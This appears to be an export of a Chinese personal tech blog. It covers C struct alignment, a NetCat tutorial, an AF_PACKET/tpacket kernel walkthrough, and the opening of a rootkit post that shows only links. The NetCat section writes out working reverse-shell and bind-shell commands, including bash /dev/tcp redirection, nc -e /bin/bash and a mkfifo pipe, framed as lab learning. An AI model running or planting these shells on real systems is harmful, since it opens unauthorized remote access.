类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．</h4><p><img src="/images/gcc-st-6.png" alt="st_to_st"></p>
<h4 id="7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．"><a href="#7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．" class="headerlink" title="7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．"></a>7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．</h4><p><img src="/images/gcc-st-7.png" alt="st_to_aligned(1)"></p>
<h3 id="5-C-中的高级之处"><a href="#5-C-中的高级之处" class="headerlink" title="5. C++中的高级之处"></a>5. C++中的高级之处</h3><blockquote>
<p>至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的<strong>封装</strong>程度已经快到了<code>说话编程</code>的地步了．重复造轮子有必要吗？珍爱生命，快用py？  </p>
</blockquote>
<h4 id="1-C-中的结构体和类的区别？"><a href="#1-C-中的结构体和类的区别？" class="headerlink" title="1.C++中的结构体和类的区别？"></a>1.C++中的结构体和类的区别？</h4><p>根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题<a href="http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang">链接</a>.因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为<code>高低电平</code>或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干<del>_</del>(当然这是intel 8086时代，从286开始就开始了保护模式).</p>
<h4 id="2-C-中class的虚函数"><a href="#2-C-中class的虚函数" class="headerlink" title="2. C++中class的虚函数"></a>2. C++中class的虚函数</h4><p>C++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(<code>obj.func(a, b, c);</code>)在编译器翻译的汇编代码里面等价于(<code>func(&amp;obj, a, b, c);</code>),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊….</p>
<hr>
<p>先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧<del>_</del></p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>NetCat</title>
    <url>/embpgp.github.io/2016/08/26/netcat%E7%AE%80%E8%BF%B0/</url>
    <content><![CDATA[<p>参考资料:<br><a href="http://netcat.sourceforge.net/">http://netcat.sourceforge.net/</a><br><a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">gnucitizen.org</a><br><a href="http://www.oschina.net/translate/linux-netcat-command">http://www.oschina.net/translate/linux-netcat-command</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse shell</a><br><a href="https://joncraton.org/blog/46/netcat-for-windows/">NetCat for windows</a></p>
<span id="more"></span>

<hr>
<h1 id="1-nc能干啥？"><a href="#1-nc能干啥？" class="headerlink" title="1. nc能干啥？"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>
<hr>
<h1 id="2-栗子"><a href="#2-栗子" class="headerlink" title="2. 栗子:"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>
<h2 id="1-聊天"><a href="#1-聊天" class="headerlink" title="1. 聊天:"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src="/images/nc_liaotian.png" alt="nc_liaotian"></p>
<h2 id="2-监听和反弹shell-reverse-shell"><a href="#2-监听和反弹shell-reverse-shell" class="headerlink" title="2.监听和反弹shell(reverse shell)"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src="/images/nc_reverse_shell.png" alt="Reverse_shell"><br>关于反弹shell的代码网络上有很多，比如<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class="comment">#创建3号文件描述符绑定到一个读写的网络连接</span></span><br><span class="line"><span class="variable">$cat</span> &lt;&amp;3 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class="keyword">done</span><span class="comment">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></span><br></pre></td></tr></table></figure>


<h2 id="3-连接监听的shell-bind-shell"><a href="#3-连接监听的shell-bind-shell" class="headerlink" title="3. 连接监听的shell(bind shell)"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$nc</span> -l port -e /bin/bash -i</span><br></pre></td></tr></table></figure>
<p>在Client端：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$nc</span> server_ip port </span><br></pre></td></tr></table></figure>
<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mkfifo</span> /tmp/tmp_fifo</span><br><span class="line"><span class="variable">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/tmp_fifo</span><br></pre></td></tr></table></figure>
<p><img src="/images/nc_bind_shell.png" alt="bind_shell"></p>
<h2 id="4-传送文件"><a href="#4-传送文件" class="headerlink" title="4. 传送文件"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>
<p>Sender:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$nc</span> -l Port &lt; file</span><br></pre></td></tr></table></figure>

<p>Receiver:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$nc</span> IP Port &gt; file</span><br></pre></td></tr></table></figure>
<p><img src="/images/nc_file_send.png" alt="file_send"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>
<hr>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>network security</tag>
        <tag>shell</tag>
        <tag>pipe</tag>
      </tags>
  </entry>
  <entry>
    <title>psock_tpacket实践</title>
    <url>/embpgp.github.io/2025/03/11/psock-tpacket%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<blockquote>
<p>抓包原理初识</p>
</blockquote>
<span id="more"></span>

<p>参考资料:<br><a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.10.1.tar.gz">https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.10.1.tar.gz</a><br><a href="https://docs.kernel.org/networking/packet_mmap.html">https://docs.kernel.org/networking/packet_mmap.html</a><br><a href="https://www.zhihu.com/question/486178226/answer/2587632732">https://www.zhihu.com/question/486178226/answer/2587632732</a><br><a href="https://jgsun.github.io/2019/01/21/linux-tcpdump/">https://jgsun.github.io/2019/01/21/linux-tcpdump/</a></p>
<hr>
<blockquote>
<p>分析 tools/testing/selftests/net/psock_tpacket.c</p>
</blockquote>
<h1 id="下载内核源码并编译测试程序"><a href="#下载内核源码并编译测试程序" class="headerlink" title="下载内核源码并编译测试程序"></a>下载内核源码并编译测试程序</h1><p><code>cd linux-3.10.1/tools/testing/selftests/net &amp;&amp; make</code><br><img src="/images/tpacket_01.png" alt="tpacket_compile"></p>
<h1 id="分析初始化"><a href="#分析初始化" class="headerlink" title="分析初始化"></a>分析初始化</h1><p>首先定位到pfsocket函数，其中需要初始化一个domain为PF_PACKET，type为SOCK_RAW的套接字，通过分析PF_PACKET是宏定义AF_PACKET一样的值，<br>而在Linux内核的介绍当中AF_PACKET专门用来嗅探流量用的，类似wireshark和tcpdump;当调用到setsockopt的时候，内核对应packet_setsockopt函数，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pfsocket</span><span class="params">(<span class="keyword">int</span> ver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret, sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (sock == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &amp;ver, <span class="keyword">sizeof</span>(ver));</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>直接看V3版本（当然最正确的方式是根据当前内核支持的版本自动选择v1/v2/v3）,设置版本的时候只是简单给po-&gt;tp_version赋值。<br>当再次调用设置PACKET_RX_RING或者PACKET_TX_RING的时候，会进入到packet_set_ring，这里会根据应用层的配置（例如使用mmap方案）来决定使用<br>哪个收包函数，在有环形缓冲区的方案情况下，会调用<code>pg_vec = alloc_pg_vec(req, order);</code> 申请内存页面，并指向当前的sock的，等待后续应用层调用<br>mmap的时候，通过给应用程序插入vma并指向同样的内存区域，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line">	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">		<span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (optlen &lt; len)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (pkt_sk(sk)-&gt;has_vnet_hdr)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;req_u.req, optval, len))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">return</span> packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">			optname == PACKET_TX_RING);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">	<span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">switch</span> (val) &#123;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">			po-&gt;tp_version = val;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在这里会判断是否有环形缓冲区来决定采用哪个收包函数<br><code>po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?                         tpacket_rcv : packet_rcv;</code></p>
<p>两者的差异可以参考上述 <a href="https://jgsun.github.io/2019/01/21/linux-tcpdump/">https://jgsun.github.io/2019/01/21/linux-tcpdump/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">		swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line">		rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">		rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">		rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">		spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">		swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">		swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">		rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">		po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">						tpacket_rcv : packet_rcv;</span><br><span class="line">		skb_queue_purge(rb_queue);</span><br><span class="line">		<span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">			pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">			       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>也可以简单查看下面的视图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|  Network Interface  |</span><br><span class="line">+----------+----------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">+----------+----------+</span><br><span class="line">|   Protocol Hook     |</span><br><span class="line">|   (prot_hook.func)  +---&gt; [ tpacket_rcv ] 带环形缓冲区</span><br><span class="line">|                     |       |</span><br><span class="line">+----------+----------+       | 直接写入共享内存</span><br><span class="line">           |                  |</span><br><span class="line">           |                  v</span><br><span class="line">           |        +---------+---------+</span><br><span class="line">           |        |  Ring Buffer      |</span><br><span class="line">           |        | (pg_vec)          |</span><br><span class="line">           |        +-------------------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">+----------+----------+</span><br><span class="line">|   packet_rcv        +---&gt; 传统接收路径</span><br><span class="line">|                     |      (sk_receive_queue)</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当应用程序调用mmap的时候，其中第一个参数fd是PF_PACKET类型的，最终会调用到内核的packet_mmap函数，通过调用<code>vm_insert_page</code><br>将环形缓冲区的地址插入到进程的vma里面，应用程序可以正常访问。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	start = vma-&gt;vm_start;</span><br><span class="line">	<span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (rb-&gt;pg_vec == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">			<span class="keyword">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;</span><br><span class="line">			<span class="keyword">int</span> pg_num;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (pg_num = <span class="number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;</span><br><span class="line">				page = pgv_to_page(kaddr);</span><br><span class="line">				err = vm_insert_page(vma, start, page);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(err))</span><br><span class="line">					<span class="keyword">goto</span> out;</span><br><span class="line">				start += PAGE_SIZE;</span><br><span class="line">				kaddr += PAGE_SIZE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而后就是bind具体的网卡，可以选择any，这里可以通过SOL_SOCKET层配合SO_ATTACH_FILTER，注入类似于tcpdump的过滤语法规则，而后数据流就开始了。</p>
<h1 id="AF-PACKET收包流程"><a href="#AF-PACKET收包流程" class="headerlink" title="AF_PACKET收包流程"></a>AF_PACKET收包流程</h1><p>当应用层通过poll或者其他的轮询方式发现rx_ring有可读的数据的时候，就可以将数据包做进一步处理了。正常网卡先通过软中断经过gro等操作后，在进入协议栈之前<br>会在<code>__netif_receive_skb_core</code>函数寻找注册的ptype_all找到回调函数，在这里<br>AF_PACKET的就是tpacket_rcv。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">	list_for_each_entry_rcu(ptype, &amp;ptype_all, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!ptype-&gt;dev || ptype-&gt;dev == skb-&gt;dev) &#123;</span><br><span class="line">			<span class="keyword">if</span> (pt_prev)</span><br><span class="line">				ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">			pt_prev = ptype;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>跑<code>run_filter</code>是否匹配目标数据包，若不命中就直接跳过，否则通过<br><code>h.raw = packet_current_rx_frame(po, skb,                     TP_STATUS_KERNEL, (macoff+snaplen));</code>寻找一个<br>空闲frame，调用<code>skb_copy_bits(skb, 0, h.raw + macoff, snaplen);</code>将skb的线性区和分片区（若有，存储在skb_shinfo指向的多个页面以及关联的SKB分片链表一次性拷贝到<code>h.raw + macoff</code>,而后更新status，并通过<code>sk-&gt;sk_data_ready(sk, 0);</code>唤醒应用进程，此时应用层拿到的frame就是现成的数据包了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	snaplen = skb-&gt;len;</span><br><span class="line"></span><br><span class="line">	res = run_filter(skb, sk, snaplen);</span><br><span class="line">	<span class="keyword">if</span> (!res)</span><br><span class="line">		<span class="keyword">goto</span> drop_n_restore;</span><br><span class="line">	<span class="keyword">if</span> (snaplen &gt; res)</span><br><span class="line">		snaplen = res;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="应用层处理"><a href="#应用层处理" class="headerlink" title="应用层处理"></a>应用层处理</h1><p>V3版本直接调用walk_v3_rx处理，通过<code>__v3_walk_block</code>将数据包摘下来（比如在拷贝到预申请的应用层缓冲区，然后调用<code>__v3_flush_block</code>刷新块状态，内核便可以继续读写该块。</p>
<blockquote>
<p>这里可以简单再用一个udp套接字，将拿到的数据包，再通过<code>sendto</code>转发出去（流量采集），以实现类似网络流量分析的功能。考虑到CPU开销问题，有一些优化思路：<br>1、可以先用sendmmsg批量发送（内核最大1024），即应用层每缓存1024的数据包发起一次系统调用，将数据批量拷贝到内核发送，以降低系统调用次数；2、通过AF_PACKET的发送缓冲区mmap，直接从rx_ring摘下来后，稍微”加工”一下写入另一个AF_PACKET发送出去，这就需要自己构造L2-L4等，进一步降低拷贝带来的CPU开销。3、通过将GRO的思想移植到应用层，进一步降低发送端PPS，这样的话就需要应用层缓存抓取的流量，需要实际的测试数据对比第2点。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">walk_v3</span><span class="params">(<span class="keyword">int</span> sock, struct ring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ring-&gt;type == PACKET_RX_RING)</span><br><span class="line">		walk_v3_rx(sock, ring);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		bug_on(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">walk_v3_rx</span><span class="params">(<span class="keyword">int</span> sock, struct ring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> block_num = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pfd</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_desc</span> *<span class="title">pbd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> udp_sock[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        bug_on(ring-&gt;type != PACKET_RX_RING);</span><br><span class="line"></span><br><span class="line">        pair_udp_open(udp_sock, PORT_BASE);</span><br><span class="line">        pair_udp_setfilter(sock);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;pfd, <span class="number">0</span>, <span class="keyword">sizeof</span>(pfd));</span><br><span class="line">        pfd.fd = sock;</span><br><span class="line">        pfd.events = POLLIN | POLLERR;</span><br><span class="line">        pfd.revents = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pair_udp_send(udp_sock, NUM_PACKETS);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (total_packets &lt; NUM_PACKETS * <span class="number">2</span>) &#123;</span><br><span class="line">                pbd = (struct block_desc *) ring-&gt;rd[block_num].iov_base;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> ((BLOCK_STATUS(pbd) &amp; TP_STATUS_USER) == <span class="number">0</span>)</span><br><span class="line">                        poll(&amp;pfd, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                __v3_walk_block(pbd, block_num);</span><br><span class="line">                __v3_flush_block(pbd);</span><br><span class="line"></span><br><span class="line">                block_num = (block_num + <span class="number">1</span>) % ring-&gt;rd_num;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pair_udp_close(udp_sock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (total_packets != <span class="number">2</span> * NUM_PACKETS) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;walk_v3_rx: received %u out of %u pkts\n&quot;</span>,</span><br><span class="line">                        total_packets, NUM_PACKETS);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot; %u pkts (%u bytes)&quot;</span>, NUM_PACKETS, total_bytes &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>结合ebpf技术，轻量级agent支持旁路https解密，分析主动外联场景。 参考<a href="https://github.com/gojue/ecapture">https://github.com/gojue/ecapture</a></p>
]]></content>
      <categories>
        <category>study</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>r00tk1t init</title>
    <url>/embpgp.github.io/2017/01/12/r00tk1t-init/</url>
    <content><![CDATA[<p>参考:<br><a href="http://www.freebuf.com/articles/system/54263.html">http://www.freebuf.com/articles/system/54263.html</a><br><a href="https://chirath02.wordpress.com/tag/asmlinkage/">https://chirath02.wordpress.com/tag/asmlinkage/</a><br><a href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd">r00tk1t基础实验</a><br><a href="https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/">https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/</a><br><a href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a><br><a href="http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf">http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf</a><br><a href="https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/">https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/</a></p>
<span id="more"></span>


<h1 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s this?"></a>What’s this?</h1><p>关于其概念可以参考<a href="https://en.wikipedia.org/wiki/Rootkit">维基百科</a>。</p>
